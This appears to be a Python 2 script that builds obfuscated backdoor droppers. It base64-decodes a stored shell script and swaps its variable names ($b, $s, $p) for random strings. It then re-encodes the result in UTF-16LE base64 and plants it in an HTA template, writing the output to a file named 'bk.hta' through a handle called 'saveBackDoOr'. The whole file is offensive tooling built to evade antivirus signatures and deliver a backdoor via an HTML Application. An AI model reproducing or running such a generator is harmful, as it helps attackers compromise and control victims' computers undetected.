import base64
import random
import string 
import time
saveShellWithNull = open("shellWithNull", "w")
#Decode Strings base64  
def decodbs64():
   filename = "Base64"
   shell = open(filename, "r")
   ReadShell=shell.read()
   getFileWithoutNull=base64.b64decode(ReadShell).replace("\00", "")
   obfASW(getFileWithoutNull)

def obfASW(getFileWithoutNullT):
      
   time.sleep(2)
   randomNumber=random.randint(1,60)
   genStrOne=''.join(random.choice(string.ascii_letters) for x in range(randomNumber))
   #print test
   roundNone=getFileWithoutNullT.replace("$b", "$"+genStrOne)
   #print roundNone
   randomNumber2=random.randint(1,40)
   genStrTwo=''.join(random.choice(string.ascii_letters) for x in range(randomNumber2))
   roundNTwo=roundNone.replace("$s", "$"+genStrTwo)
   #print roundNTwo
   randomNumber3=random.randint(1,39)
   genStrThree=''.join(random.choice(string.ascii_letters) for x in range(randomNumber3))
   roundNThree=roundNTwo.replace("$p", "$"+genStrThree)
   retrunNulls(roundNThree)

def retrunNulls(roundNThreeT):

   shellWithNull=u"{}".format(roundNThreeT).encode('utf-16le')
   shellReady=base64.b64encode(shellWithNull)
   saveShellWithNull.write(shellReady)
   ProcessCompleted(shellReady)

time.sleep(4)
def ProcessCompleted(shellReadyT):
   replaceHta = open("htafile.hta", "r")
   readHta=replaceHta.read()

   randomNumberV=random.randint(3,42)
   genVarOne=''.join(random.choice(string.ascii_letters) for x in range(randomNumberV))

   roundNOneV=readHta.replace("one", genVarOne)
   roundNTwoV=roundNOneV.replace("Two", genVarOne)
   roundNThreeV=roundNTwoV.replace("Three",shellReadyT)
   randomNumberZ=random.randint(5,19)
   genVarZero=''.join(random.choice(string.ascii_letters) for x in range(randomNumberZ))
#print genVarZero
   roundNZeroV=roundNThreeV.replace("zeroo",genVarZero)
#print roundNZeroV
   saveBackDoOr = open("bk.hta", "w")
   saveBackDoOr.write(roundNZeroV)


decodbs64()

